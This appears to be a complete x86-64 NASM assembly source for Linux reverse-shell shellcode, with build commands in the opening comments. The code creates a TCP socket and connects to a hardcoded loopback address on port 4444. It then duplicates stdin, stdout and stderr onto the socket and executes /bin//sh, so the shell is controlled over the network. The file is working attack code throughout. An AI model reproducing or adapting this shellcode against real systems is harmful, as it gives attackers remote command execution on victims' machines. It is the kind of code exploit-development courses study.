;nasm -f elf64 -o reverse.o template.asm
;ld -o reverse reverse.o
;objdump -d -M intel reverse.o

section .text
        global _start

_start:

  sar rax, 63
  sar rbx, 63
  sub rcx, rcx
  xor rdx, rdx
        xor rsi, rsi
        xor rdi, rdi

        push 0x0101017f                         ; Address (127.0.0.1)
        push word 0x5c11                        ; Port (4444)
        push word 2                             ; Address family -AF_INET (0x2)
        push 42                                 ; connect syscall
        push byte 16                            ; length
        push byte 41                            ; socket syscall
        push byte 1                             ; type - SOCK_STREAM (0x1)
        push byte 2                             ; family - AF_INET (0x2)

        pop rdi                                 ; family
        pop rsi                                 ; type
        xor rdx, rdx                            ; protocol
        pop rax                                 ; socket syscall
        syscall

        mov rdi, rax                            ; sockfd
        pop rdx                                 ; length
        pop rax                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall

        xor rsi, rsi
loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle loop

  sub rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
  mov rdx, 0xFFFFFFFFFFFFFFFF
  add rdx, 1
        mov al, 59
        syscall